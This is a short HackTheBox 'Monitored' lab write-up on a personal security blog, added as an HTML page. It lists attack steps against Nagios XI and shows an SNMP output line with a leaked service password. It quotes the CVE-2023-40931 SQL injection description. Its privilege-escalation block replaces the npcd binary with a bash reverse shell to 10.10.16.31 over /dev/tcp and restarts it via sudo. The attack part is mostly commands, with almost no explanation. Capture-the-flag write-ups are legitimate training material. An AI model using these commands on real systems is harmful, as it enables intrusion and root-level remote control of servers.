@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html><head lang="en">
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox: Monitored - keruen&#39;s Security Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="HackTheBox: Monitored" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keruenn.github.io/posts/monitored/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-14T19:36:49+05:00" />
+<meta property="article:modified_time" content="2024-03-14T19:36:49+05:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HackTheBox: Monitored"/>
+<meta name="twitter:description" content=""/>
+<script src="https://keruenn.github.io/js/feather.min.js"></script>
+	
+	
+        <link href="https://keruenn.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://keruenn.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://keruenn.github.io/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css"  disabled />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://keruenn.github.io/">keruen&#39;s Security Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://keruenn.github.io/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">HackTheBox: Monitored</h1>
+			<div class="meta">Posted on Mar 14, 2024</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="content">Content</h2>
+<p>enum smb
+get token
+explore sqli
+dump database
+get api token
+login
+spawn reverse shell</p>
+<pre tabindex="0"><code>iso.3.6.1.2.1.25.4.2.1.5.618 = STRING: &#34;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
+</code></pre><p>CVE-2023-40931</p>
+<pre tabindex="0"><code>A SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner_message-ajaxhelper.php
+</code></pre><p>priv escalation</p>
+<pre tabindex="0"><code>rm /usr/local/nagios/bin/npcd
+touch /usr/local/nagios/bin/npcd
+chmod +x /usr/local/nagios/bin/npcd
+echo &#39;#!/bin/bash&#39; &gt; /usr/local/nagios/bin/npcd
+echo &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.31/1235 0&gt;&amp;1&#39;&#34; &gt;&gt; /usr/local/nagios/bin/npcd
+sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
+</code></pre>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"></div>
+  <div class="footer-info">
+    2024  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+</div>
+    </body>
+</html>
